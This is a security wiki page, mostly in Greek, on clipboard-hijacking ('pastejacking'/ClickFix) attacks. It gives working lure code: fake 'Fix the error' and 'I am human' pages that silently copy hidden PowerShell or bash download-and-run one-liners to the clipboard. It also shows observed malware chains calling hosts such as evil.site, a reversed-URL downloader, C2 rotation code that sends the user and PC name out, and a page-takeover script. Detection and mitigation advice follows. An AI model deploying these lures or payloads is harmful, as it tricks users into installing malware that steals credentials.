# Clipboard Hijacking (Pastejacking) Επιθέσεις

{{#include ../../banners/hacktricks-training.md}}

> "Ποτέ μην επικολλάτε κάτι που δεν έχετε αντιγράψει εσείς οι ίδιοι." – παλιά αλλά εξακολουθεί να ισχύει συμβουλή

## Επισκόπηση

Το Clipboard hijacking – επίσης γνωστό ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συνήθως αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη σελίδα web (ή οποιοδήποτε περιβάλλον που εκτελεί JavaScript, όπως μια εφαρμογή Electron ή Desktop) τοποθετεί προγραμματιστικά κείμενο υπό τον έλεγχο του επιτιθέμενου στο σύστημα clipboard. Τα θύματα συνήθως ενθαρρύνονται, με προσεκτικά σχεδιασμένες οδηγίες κοινωνικής μηχανικής, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα terminal και να *paste* το περιεχόμενο του clipboard, εκτελώντας αμέσως αυθαίρετες εντολές.

Επειδή **δεν κατεβαίνει κανένα αρχείο και δεν ανοίγει κανένα attachment**, η τεχνική παρακάμπτει τους περισσότερους μηχανισμούς ασφαλείας e-mail και web-content που επιβλέπουν attachments, macros ή άμεση εκτέλεση εντολών. Η επίθεση είναι επομένως δημοφιλής σε phishing καμπάνιες που διανέμουν κοινές οικογένειες malware όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## Εξαναγκασμένα κουμπιά “Copy” και κρυμμένα payloads (macOS one-liners)

Μερικά macOS infostealers κλωνοποιούν sites εγκατάστασης (π.χ. Homebrew) και **εξαναγκάζουν τη χρήση ενός κουμπιού “Copy”** ώστε οι χρήστες να μην μπορούν να επισημάνουν μόνο το ορατό κείμενο. Η εγγραφή στο clipboard περιέχει την αναμενόμενη εντολή εγκατάστασης μαζί με ένα προσαρτημένο Base64 payload (π.χ., `...; echo <b64> | base64 -d | sh`), έτσι ώστε μια μοναδική επικόλληση να εκτελεί και τα δύο ενώ το UI κρύβει το επιπλέον στάδιο.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Οι παλαιότερες καμπάνιες χρησιμοποιούσαν `document.execCommand('copy')`, οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## Ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν typosquatted ή compromised ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Εγχυμένο JavaScript **ClearFake** καλεί μια βοηθητική συνάρτηση `unsecuredCopyToClipboard()` που σιωπηλά αποθηκεύει ένα Base64-encoded PowerShell one-liner στο πρόχειρο.
3. Οι HTML οδηγίες λένε στο θύμα: *«Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. `powershell.exe` εκτελείται, κατεβάζοντας ένα αρχείο που περιέχει ένα νόμιμο εκτελέσιμο μαζί με ένα κακόβουλο DLL (classic DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, εγχύει shellcode και εγκαθιστά persistence (π.χ. scheduled task) — τελικά τρέχοντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Παράδειγμα αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά στον κατάλογό του το `msvcp140.dll`.
* Το κακόβουλο DLL επιλύει δυναμικά APIs με **GetProcAddress**, κατεβάζει δύο δυαδικά αρχεία (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας κυλιόμενο κλειδί XOR `"https://google.com/"`, εγχέει το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει το `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Αποκτά ένα MSI payload → τοποθετεί το `libcef.dll` δίπλα σε μια υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση του **mshta** εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, αποσυμπιέζει το `Boat.pst` (CAB), ανακατασκευάζει το `AutoIt3.exe` μέσω `extrac32` & συνένωσης αρχείων και τελικά τρέχει ένα `.a3x` script που εξάγει διαπιστευτήρια του browser στο `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK με rotating C2 (PureHVNC)

Κάποιες εκστρατείες ClickFix παραλείπουν εντελώς το download αρχείων και ζητούν από τα θύματα να επικολλήσουν έναν one‑liner που τραβάει (fetches) και εκτελεί JavaScript μέσω WSH, το κάνει persistent (persists it), και περιστρέφει το C2 καθημερινά. Παράδειγμα παρατηρημένης αλυσίδας:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Κύρια χαρακτηριστικά
- Obfuscated URL που αντιστρέφεται κατά την εκτέλεση για να αποτρέψει την πρόχειρη επιθεώρηση.
- JavaScript διατηρεί την παρουσία του μέσω Startup LNK (WScript/CScript), και επιλέγει το C2 βάσει της τρέχουσας ημέρας – επιτρέποντας γρήγορη domain rotation.

Ελάχιστο JS απόσπασμα που χρησιμοποιείται για την εναλλαγή C2s ανά ημερομηνία:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιδρύει persistence και τραβάει ένα RAT (π.χ., PureHVNC), συχνά pinning TLS σε ένα hardcoded certificate και chunking traffic.

Detection ideas specific to this variant
- Δέντρο διεργασιών: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Αρχεία εκκίνησης: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Επαναλαμβανόμενα `powershell -NoProfile -NonInteractive -Command -` με μεγάλα stdin payloads για να τροφοδοτήσουν μεγάλα scripts χωρίς μεγάλες γραμμές εντολών.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` κάτω από ένα updater‑looking task/path (π.χ., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Καθημερινά rotating C2 hostnames και URLs με το pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχέτιση clipboard write γεγονότων που ακολουθούνται από Win+R επικόλληση και άμεση εκτέλεση `powershell.exe`.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` κρατάει ιστορικό των **Win + R** εντολών – αναζητήστε ασυνήθιστα Base64 / obfuscated καταχωρήσεις.
* Security Event ID **4688** (Process Creation) όπου `ParentImage` == `explorer.exe` και `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινούς φακέλους λίγο πριν από το ύποπτο γεγονός 4688.
* EDR clipboard sensors (if present) – συσχέτιση `Clipboard Write` που ακολουθείται άμεσα από νέο PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Πρόσφατες καμπάνιες μαζικά παράγουν ψεύτικες σελίδες επαλήθευσης CDN/browser ("Just a moment…", IUAM-style) που αναγκάζουν τους χρήστες να αντιγράψουν OS-specific εντολές από το clipboard τους σε native κονσόλες. Αυτό μεταφέρει την εκτέλεση έξω από το browser sandbox και λειτουργεί σε Windows και macOS.

Key traits of the builder-generated pages
- Ανίχνευση OS μέσω `navigator.userAgent` για την προσαρμογή των payloads (Windows PowerShell/CMD vs. macOS Terminal). Προαιρετικά decoys/no-ops για μη υποστηριζόμενα OS ώστε να διατηρηθεί η ψευδαίσθηση.
- Αυτόματη αντιγραφή στο clipboard σε benign UI actions (checkbox/Copy) ενώ το εμφανιζόμενο κείμενο μπορεί να διαφέρει από το περιεχόμενο του clipboard.
- Mobile blocking και ένα popover με βήμα-προς-βήμα οδηγίες: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Προαιρετική obfuscation και single-file injector για να αντικαταστήσει το DOM ενός compromised site με ένα Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence της αρχικής εκτέλεσης
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχιστεί μετά το κλείσιμο του τερματικού, μειώνοντας τα ορατά ίχνη.

In-place page takeover σε compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες Detection & hunting ειδικές για δολώματα τύπου IUAM
- Web: Σελίδες που δεσμεύουν το Clipboard API σε verification widgets; ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του περιεχομένου του clipboard; `navigator.userAgent` branching; Tailwind + single-page replace σε ύποπτα περιβάλλοντα.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από αλληλεπίδραση με browser; batch/MSI installers που εκτελούνται από `%TEMP%`.
- macOS endpoint: Terminal/iTerm που spawnάρει `bash`/`curl`/`base64 -d` με `nohup` κοντά σε browser events; background jobs που επιβιώνουν μετά το κλείσιμο του terminal.
- Συσχέτιση του `RunMRU` Win+R ιστορικού και των clipboard writes με την επακόλουθη δημιουργία console processes.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – απενεργοποιήστε την πρόσβαση εγγραφής στο clipboard (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε user gesture.
2. Security awareness – μάθετε στους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε έναν text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για να μπλοκάρουν αυθαίρετους one-liners.
4. Network controls – μπλοκάρετε outbound requests προς γνωστούς pastejacking και malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** συχνά καταχράται την ίδια προσέγγιση ClickFix αφού δελεάσει χρήστες σε έναν malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
